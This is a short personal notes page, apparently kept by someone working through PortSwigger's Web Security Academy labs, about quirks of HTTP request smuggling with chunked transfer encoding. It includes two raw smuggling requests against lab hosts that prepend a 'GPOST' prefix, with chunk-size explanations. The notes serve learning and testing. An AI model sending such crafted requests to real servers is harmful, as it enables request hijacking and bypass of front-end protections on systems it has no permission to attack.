# Mad security findings

This is crazy stuff I found out in the wild. I will put here only the ones, which are the most crazy in my opinion and caused my brain to question reality. Most of those I found out during solving Portswigger’s Web security academy labs or another sandbox.


## Request Smuggling
- Requests with `Transfer-Encoding: chunked` need to have **two(!!!)** additional newlines after ending `0`.
- Chunked requests behave differently when they are multiline or single line! Consider following examples:

```
POST / HTTP/1.1
Host: some-token.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 3

5
GPOST
0


```

You can notice above GPOST is stated 5 - this exactly represents character size of `GPOST`. If you would like to include also following newline, your request would be invalid. Now lets take a look for a multiline example:

```
POST / HTTP/1.1
Host: some-token.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 3

a
GPOST
FOO
0


```

You can notice `a` above `GPOST`. It is hexadecimal representation of 10. But wait... why? Okay.. lets count: `GPOST (5 chars)` + `newline (1 char)` + `FOO (3 chars)` + `newline (1 char)`!!! Lesson to learn: Multiline chunked requests need additional ending newline to be included in your size calculation otherwise request will be invalid!

